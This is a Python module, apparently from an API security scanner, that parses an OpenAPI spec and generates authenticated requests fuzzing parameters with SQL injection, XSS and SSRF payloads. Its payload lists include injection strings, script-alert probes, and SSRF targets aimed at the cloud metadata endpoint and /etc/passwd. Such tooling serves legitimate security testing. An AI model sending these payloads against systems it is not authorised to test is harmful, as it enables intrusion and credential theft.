import uuid
import json

class InjectionModule:
    """
    Identifies user-controlled parameters in an OpenAPI spec (query, path, body)
    and constructs TaskPayloads to fuzz them with SQLi, XSS, and SSRF payloads.
    """
    def __init__(self, auth_token: str):
        self.auth_token = auth_token
        
        # Polyglot fuzzing payloads for basic injection coverage
        self.payloads = {
            "sqli": [
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin' --",
                "\" OR \"1\"=\"1"
            ],
            "xss": [
                "\"><script>alert(document.domain)</script>",
                "javascript:alert(1)//",
                "<img src=x onerror=alert(1)>"
            ],
            "ssrf": [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1:22",
                "file:///etc/passwd"
            ]
        }

    def _extract_parameters(self, operation: dict) -> list:
        params = []
        for param in operation.get("parameters", []):
            if param.get("in") in ["query", "path"]:
                params.append({"name": param["name"], "in": param["in"]})
        return params

    def identify_targets(self, openapi_spec: dict) -> list:
        targets = []
        paths = openapi_spec.get("paths", {})
        
        for path, methods in paths.items():
            for method, operation in methods.items():
                params = self._extract_parameters(operation)
                
                # We also consider POST/PUT endpoints for body injections
                if method.lower() in ["post", "put", "patch"] or params:
                    targets.append({
                        "path": path,
                        "method": method.upper(),
                        "parameters": params
                    })
                    
        return targets

    def generate_workflows(self, target_url: str, targets: list) -> list:
        tasks = []
        
        for target in targets:
            task_id = f"inj-run-{uuid.uuid4().hex[:8]}"
            generated_payloads = []
            
            # Fuzz Query and Path Parameters
            for param in target.get("parameters", []):
                for inj_type, p_list in self.payloads.items():
                    for inj_val in p_list:
                        test_path = target["path"]
                        
                        if param["in"] == "path":
                            test_path = test_path.replace(f"{{{param['name']}}}", inj_val)
                            # Fill other path params safely
                            test_path = test_path.replace("{id}", "999").replace("{user_id}", "999")
                        elif param["in"] == "query":
                            # Basic query append. Use urlencode in production.
                            test_path = test_path.replace("{id}", "999")
                            separator = "&" if "?" in test_path else "?"
                            test_path = f"{test_path}{separator}{param['name']}={inj_val}"

                        generated_payloads.append({
                            "method": target["method"],
                            "path": test_path,
                            "headers": {
                                "Authorization": f"Bearer {self.auth_token}",
                                "X-Injection-Type": inj_type
                            },
                            "body": ""
                        })
                        
            # Fuzz JSON Body on POST/PUT (simplified, assumes flat JSON map for demo)
            if target["method"] in ["POST", "PUT", "PATCH"]:
                for inj_type, p_list in self.payloads.items():
                    for inj_val in p_list:
                        # Fuzzing a generic 'data' or 'id' field in a JSON payload
                        body_content = json.dumps({"data": inj_val, "id": inj_val})
                        test_path = target["path"].replace("{id}", "999")
                        
                        generated_payloads.append({
                            "method": target["method"],
                            "path": test_path,
                            "headers": {
                                "Authorization": f"Bearer {self.auth_token}",
                                "Content-Type": "application/json",
                                "X-Injection-Type": inj_type
                            },
                            "body": body_content
                        })

            if generated_payloads:
                tasks.append({
                    "task_id": task_id,
                    "target_url": target_url,
                    "attack_type": "injection",
                    "payloads": generated_payloads
                })

        return tasks
